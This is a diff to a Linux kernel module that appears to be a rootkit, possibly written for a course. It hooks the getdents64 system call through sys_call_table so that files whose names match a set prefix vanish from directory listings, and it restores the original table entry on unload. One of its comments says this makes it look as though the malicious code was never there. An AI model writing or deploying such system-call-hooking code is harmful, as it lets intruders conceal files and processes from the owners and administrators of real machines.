@@ -51,16 +51,19 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 }
 
 // getdents64
-asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
+asmlinkage int (*original_getdents64)(struct pt_regs *);
 
-asmlinkage int sneaky_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
-  int nread = original_getdents64(fd, dirp, count);
+asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
+  int nread = original_getdents64(regs);
+  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
   struct linux_dirent64 *current_entry = dirp;
   int bpos = 0;
+  char filename[NAME_MAX] = {0};
 
   while(bpos < nread) {
     current_entry = (struct linux_dirent64 *)((char *)dirp + bpos);
-    if (strcmp(current_entry->d_name, "sneaky_process") == 0) {
+    strncpy_from_user(filename, current_entry->d_name, NAME_MAX);
+    if (strcmp(filename, PREFIX) == 0) {
       int reclen = current_entry->d_reclen;
       // overwrite the record
       memmove(current_entry, (char *)current_entry + reclen, nread - bpos - reclen);
@@ -114,6 +117,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
